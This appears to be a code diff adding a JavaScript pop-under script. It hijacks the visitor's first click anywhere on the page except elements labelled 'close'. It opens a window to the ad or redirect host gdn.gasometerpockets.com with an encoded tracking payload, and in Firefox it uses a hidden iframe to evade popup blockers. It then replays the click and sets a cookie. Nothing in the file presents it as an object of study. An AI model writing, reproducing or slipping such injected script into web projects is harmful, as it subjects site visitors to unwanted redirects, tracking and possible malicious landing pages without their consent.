@@ -1,0 +1,92 @@
+var
+    EventUtil = {
+        addHandler: function(element, type, handler) {
+            if (element.addEventListener) {
+                element.addEventListener(type, handler, true);
+            } else if (element.attachEvent) {
+                element.attachEvent("on" + type, handler);
+            } else {
+                element["on" + type] = handler;
+            }
+        },
+        removeHandler: function(element, type, handler) {
+            if (element.removeEventListener) {
+                element.removeEventListener(type, handler, true);
+            } else if (element.detachEvent) {
+                element.detachEvent("on" + type, handler);
+            } else {
+                element["on" + type] = null;
+            }
+        }
+    },
+    M = navigator.userAgent.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [],
+    evnt = (typeof M[1] != 'undefined' && M[1] == 'Chrome') ? 'mousedown' : 'mouseup';
+
+if (typeof window.c56e91f2454dac9f5aa8b85ae == 'undefined') {
+    window.c56e91f2454dac9f5aa8b85ae = function(e) {
+        e = e || window.event;
+        var target = e.target || e.srcElement;
+        if (target) {
+            var targetInfo = [
+                    target.title,
+                    target.id,
+                    target.className,
+                    target.src
+                ],
+                targetInner = target.innerHTML,
+                targetParent = target.parentNode;
+            if (targetInner && targetInner.length < 10) targetInfo.push(targetInner);
+            if (targetParent) {
+                var targetParentInner = targetParent.innerHTML;
+                if (targetParentInner && targetParentInner.length < 10) targetInfo.push(targetParentInner);
+                targetInfo.push(
+                    targetParent.title,
+                    targetParent.id,
+                    targetParent.className,
+                    targetParent.src
+                );
+            }
+            // Stop if anything contains close.
+            for (var x = 0; x < targetInfo.length; ++x) {
+                current = targetInfo[x];
+
+                if (current) {
+                    current = current.toLowerCase();
+                    if (current.indexOf('close') > -1) {
+                        return;
+                    }
+                }
+            }
+        }
+
+        var windowName = '__ctxpop' + Math.floor((Math.random() * 10000) + 1) + 's' + Math.round(+new Date()/1000) ;
+
+        if(navigator.userAgent.toLowerCase().indexOf('firefox') > -1) {
+            function ekopn(a,b,c){
+                var x;
+                document.body.appendChild(x=document.createElement("iframe")).style.display ='none';
+                return x.contentWindow.open(a,b,c)
+            }
+            var popWindow = ekopn('//gdn.gasometerpockets.com/zX76SXFJ8Asw0YWSp0qOXV7f6Y4prKHSxEP/?d=W3sicmVmZXJlciI6Imh0dHBzOlwvXC93d3cuZ29vZ2xlLmNvbS5wZVwvIn0seyJjb3VudHJ5IjoicGUifSx7ImJlciI6ImJhZGVpIn0seyJjdCI6ImZlZWQifSx7ImNoYW5uZWwiOiI5NjEyLTEwMDIifSx7InZlciI6ImJhZSJ9LHsidjIiOiJ4bWxfZmVlZF9wb3AifSx7InB0IjoiYmFkZGoifSx7InVybCI6Imh0dHA6XC9cL3d3dy5kZXR1YW1vci5iaXpcLzJcLzktY2FybG9zLWx1Y3ktMTEuaHRtbCJ9LHsiYW0iOiJyYiJ9LHsicHJvZHVjdCI6W119LHsidTEiOiIwYmFmYzU5Yy02MTU5LTQwZWMtOTY5NC0wOWJlMjgxNjE0NjkifSx7ImxpbmsiOiJodHRwOlwvXC96aTEubm92ZW1iZXItbGF4LmNvbVwvemN2aXNpdG9yXC82NmY4MTRmNC1lYjU1LTExZTUtYjM4Ni0wNmJjOTBlOTgwZjEifSx7ImFkdmVydGlzZXIiOiI1NTQ2MDdmNTQ0NWY0MmMwN2I4YjQ1NjcifSx7InBjIjoyfSx7ImluamVjdF9kb21haW4iOltdfSx7InJlcXVlc3RfZ3VpZCI6IjU2ZTkyMDc1NTAxNmQ4ZmI4YzhiNmM5NiJ9LHsiZzEiOiJ4bWwgemVyb3BhcmsgbmV3IHJvdyJ9LHsidjEiOiJkZXR1YW1vci5iaXoifSx7ImczIjpbXX0seyJob3N0bmFtZSI6ImRldHVhbW9yLmJpeiJ9LHsic2VydmljZSI6ImFkZG9uIn0seyJxdWVyeSI6InRlIHF1aWVybyBtdWNobyJ9LHsibmV0d29yayI6ImRpcmVjdCJ9LHsidjMiOltdfSx7InN1YmlkIjpbXX0seyJnMiI6ImZlZWRfb28ifSx7InB1Ymxpc2hlciI6W119XQ%3D%3D', windowName, '');
+        } else {
+            var popWindow = (typeof Window.prototype.open == 'undefined')? window.open.call(window, '//gdn.gasometerpockets.com/zX76SXFJ8Asw0YWSp0qOXV7f6Y4prKHSxEP/?d=W3sicmVmZXJlciI6Imh0dHBzOlwvXC93d3cuZ29vZ2xlLmNvbS5wZVwvIn0seyJjb3VudHJ5IjoicGUifSx7ImJlciI6ImJhZGVpIn0seyJjdCI6ImZlZWQifSx7ImNoYW5uZWwiOiI5NjEyLTEwMDIifSx7InZlciI6ImJhZSJ9LHsidjIiOiJ4bWxfZmVlZF9wb3AifSx7InB0IjoiYmFkZGoifSx7InVybCI6Imh0dHA6XC9cL3d3dy5kZXR1YW1vci5iaXpcLzJcLzktY2FybG9zLWx1Y3ktMTEuaHRtbCJ9LHsiYW0iOiJyYiJ9LHsicHJvZHVjdCI6W119LHsidTEiOiIwYmFmYzU5Yy02MTU5LTQwZWMtOTY5NC0wOWJlMjgxNjE0NjkifSx7ImxpbmsiOiJodHRwOlwvXC96aTEubm92ZW1iZXItbGF4LmNvbVwvemN2aXNpdG9yXC82NmY4MTRmNC1lYjU1LTExZTUtYjM4Ni0wNmJjOTBlOTgwZjEifSx7ImFkdmVydGlzZXIiOiI1NTQ2MDdmNTQ0NWY0MmMwN2I4YjQ1NjcifSx7InBjIjoyfSx7ImluamVjdF9kb21haW4iOltdfSx7InJlcXVlc3RfZ3VpZCI6IjU2ZTkyMDc1NTAxNmQ4ZmI4YzhiNmM5NiJ9LHsiZzEiOiJ4bWwgemVyb3BhcmsgbmV3IHJvdyJ9LHsidjEiOiJkZXR1YW1vci5iaXoifSx7ImczIjpbXX0seyJob3N0bmFtZSI6ImRldHVhbW9yLmJpeiJ9LHsic2VydmljZSI6ImFkZG9uIn0seyJxdWVyeSI6InRlIHF1aWVybyBtdWNobyJ9LHsibmV0d29yayI6ImRpcmVjdCJ9LHsidjMiOltdfSx7InN1YmlkIjpbXX0seyJnMiI6ImZlZWRfb28ifSx7InB1Ymxpc2hlciI6W119XQ%3D%3D', windowName, '') : Window.prototype.open.call(window, '//gdn.gasometerpockets.com/zX76SXFJ8Asw0YWSp0qOXV7f6Y4prKHSxEP/?d=W3sicmVmZXJlciI6Imh0dHBzOlwvXC93d3cuZ29vZ2xlLmNvbS5wZVwvIn0seyJjb3VudHJ5IjoicGUifSx7ImJlciI6ImJhZGVpIn0seyJjdCI6ImZlZWQifSx7ImNoYW5uZWwiOiI5NjEyLTEwMDIifSx7InZlciI6ImJhZSJ9LHsidjIiOiJ4bWxfZmVlZF9wb3AifSx7InB0IjoiYmFkZGoifSx7InVybCI6Imh0dHA6XC9cL3d3dy5kZXR1YW1vci5iaXpcLzJcLzktY2FybG9zLWx1Y3ktMTEuaHRtbCJ9LHsiYW0iOiJyYiJ9LHsicHJvZHVjdCI6W119LHsidTEiOiIwYmFmYzU5Yy02MTU5LTQwZWMtOTY5NC0wOWJlMjgxNjE0NjkifSx7ImxpbmsiOiJodHRwOlwvXC96aTEubm92ZW1iZXItbGF4LmNvbVwvemN2aXNpdG9yXC82NmY4MTRmNC1lYjU1LTExZTUtYjM4Ni0wNmJjOTBlOTgwZjEifSx7ImFkdmVydGlzZXIiOiI1NTQ2MDdmNTQ0NWY0MmMwN2I4YjQ1NjcifSx7InBjIjoyfSx7ImluamVjdF9kb21haW4iOltdfSx7InJlcXVlc3RfZ3VpZCI6IjU2ZTkyMDc1NTAxNmQ4ZmI4YzhiNmM5NiJ9LHsiZzEiOiJ4bWwgemVyb3BhcmsgbmV3IHJvdyJ9LHsidjEiOiJkZXR1YW1vci5iaXoifSx7ImczIjpbXX0seyJob3N0bmFtZSI6ImRldHVhbW9yLmJpeiJ9LHsic2VydmljZSI6ImFkZG9uIn0seyJxdWVyeSI6InRlIHF1aWVybyBtdWNobyJ9LHsibmV0d29yayI6ImRpcmVjdCJ9LHsidjMiOltdfSx7InN1YmlkIjpbXX0seyJnMiI6ImZlZWRfb28ifSx7InB1Ymxpc2hlciI6W119XQ%3D%3D', windowName, '');
+        }
+
+        if (typeof popWindow === 'undefined' || popWindow === null) {
+            // console.log(popWindow);
+            return false;
+        }
+
+    var date = new Date();
+    date.setTime(date.getTime() + 0 * 1000);
+    document.cookie = "__ctxpop=0; expires=" + date.toGMTString() + "; path=/";
+
+        if (typeof document.createEvent !== 'undefined') {
+            var event = document.createEvent("MouseEvents");
+            event.initMouseEvent("click", !0, !0, window, 0, e.screenX, e.screenY, e.clientX, e.clientY, !1, !1, !1, !1, 0, null);
+            e.target.dispatchEvent(event);
+        }
+        EventUtil.removeHandler(window, evnt, window.c56e91f2454dac9f5aa8b85ae);
+    };
+    EventUtil.addHandler(window, evnt, window.c56e91f2454dac9f5aa8b85ae);
+}
